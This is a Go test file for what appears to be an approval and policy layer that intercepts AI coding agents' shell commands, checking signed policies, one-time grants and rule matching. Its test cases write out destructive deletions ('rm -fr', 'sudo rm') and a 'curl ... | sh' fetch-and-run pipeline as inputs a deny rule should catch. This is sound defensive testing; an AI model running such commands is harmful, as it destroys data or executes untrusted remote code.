package hooks

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"
)

func TestCommandMatching(t *testing.T) {
	for _, tc := range []struct{ command, exe, prefix, action, want string }{
		{"echo rm", "rm", "", "deny", "unmatched"},
		{"/bin/rm -fr ./demo", "rm", "", "deny", "matched"},
		{"echo 'rm -rf demo'", "rm", "", "deny", "unmatched"},
		{"echo ok && rm demo", "rm", "", "deny", "matched"},
		{"echo ok; rm demo", "echo", "", "allow", "unmatched"},
		{"rm \"$TARGET\"", "rm", "", "deny", "unresolved"},
		{"sudo rm demo", "rm", "", "deny", "unresolved"},
		{"if true; then rm demo; fi", "rm", "", "deny", "unresolved"},
		{"time rm demo", "rm", "", "deny", "unresolved"},
		{"rm demo > out", "rm", "", "deny", "unresolved"},
		{"rm 'unfinished", "rm", "", "deny", "unresolved"},
		{"rm /srv/data/a", "rm", "/srv/data", "deny", "matched"},
		{"rm /srv/database/a", "rm", "/srv/data", "deny", "unmatched"},
		{"rm /srv/data/a /etc/a", "rm", "/srv/data", "allow", "unmatched"},
	} {
		if got := commandMatch(&CommandCondition{Executable: tc.exe, PathPrefix: tc.prefix}, tc.command, "", tc.action); got != tc.want {
			t.Errorf("%s: %s != %s", tc.command, got, tc.want)
		}
	}
	if commandMatch(&CommandCondition{Executable: "rm", ArgsAny: []string{"-r"}}, "rm -fr demo", "", "deny") != "matched" {
		t.Fatal("combined flags")
	}
	if commandMatch(&CommandCondition{Executable: "curl", PipeTo: []string{"sh"}}, "curl https://example.com/a | sh", "", "deny") != "matched" {
		t.Fatal("pipeline")
	}
}

func TestCommandPolicyPersistentApprovalAndAudit(t *testing.T) {
	ctx := context.Background()
	now := time.Now()
	s := openTestStore(t, storeDirectory(t), 100)
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pub := elliptic.Marshal(elliptic.P256(), key.X, key.Y)
	if err := s.ConfigureControl(ctx, pub); err != nil {
		t.Fatal(err)
	}
	p := ToolPolicy{Schema: 3, Domain: "aidr.tool-policy/3", Device: "device-a", Revision: "1", Issued: fmt.Sprint(now.Unix()), Default: "allow", Rules: []ToolRule{{ID: "review", Agent: "codex", Tool: "*", Decision: "ask", Command: &CommandCondition{Executable: "rm"}}}}
	if err := s.ApplyToolPolicy(ctx, signGrant(t, key, p), now); err != nil {
		t.Fatal(err)
	}
	var input map[string]any
	_ = json.Unmarshal([]byte(storeInput), &input)
	input["tool_name"] = "Bash"
	input["tool_input"] = map[string]string{"command": "rm /tmp/isolated-command-fixture"}
	raw, _ := json.Marshal(input)
	record, err := s.Receive(ctx, testID(1), "501", "codex", "PreToolUse", raw)
	if err != nil {
		t.Fatal(err)
	}
	if record.Event.CommandMatch == nil || !containsRule(record.Event.CommandMatch.Matched, "review") {
		t.Fatal("missing local evidence")
	}
	if d, err := s.BeginApproval(ctx, record, now); err != nil || d.Decision != "ask" {
		t.Fatal(d, err)
	}
	scope, err := s.ScopeFor(record, "review", "1")
	if err != nil {
		t.Fatal(err)
	}
	id := strings.Repeat("a", 32)
	if err = s.BindApproval(ctx, record.EventID, id, scope); err != nil {
		t.Fatal(err)
	}
	grant := ToolGrant{Schema: 1, Domain: "aidr.tool-grant/1", ID: id, Nonce: strings.Repeat("b", 32), Revision: "1", Decision: "allow", Issued: fmt.Sprint(now.Unix()), Expires: fmt.Sprint(now.Add(time.Minute).Unix()), Scope: scope}
	if err = s.ApplyGrant(ctx, signGrant(t, key, grant), pub, now); err != nil {
		t.Fatal(err)
	}
	if d, err := s.PollApproval(ctx, record.EventID, "501", false, now); err != nil || d.Decision != "allow" {
		t.Fatal(d, err)
	}
	if d, _ := s.PollApproval(ctx, record.EventID, "501", false, now); d.Decision == "allow" {
		t.Fatal("repeated consumption")
	}
	unresolved := Event{Agent: "codex", Tool: "Bash"}
	if d := s.EvaluateTool(unresolved, now); d.Decision != "allow" || d.Rule != "default" || !d.Unresolved {
		t.Fatal(d)
	}
	_ = s.SetControlMode("audit")
	if d := s.EvaluateTool(unresolved, now); d.Decision != "allow" {
		t.Fatal("audit blocked", d)
	}
	p.Schema = 2
	p.Domain = "aidr.tool-policy/2"
	p.Revision = "2"
	if s.ApplyToolPolicy(ctx, signGrant(t, key, p), now) == nil {
		t.Fatal("command in legacy schema accepted")
	}
}
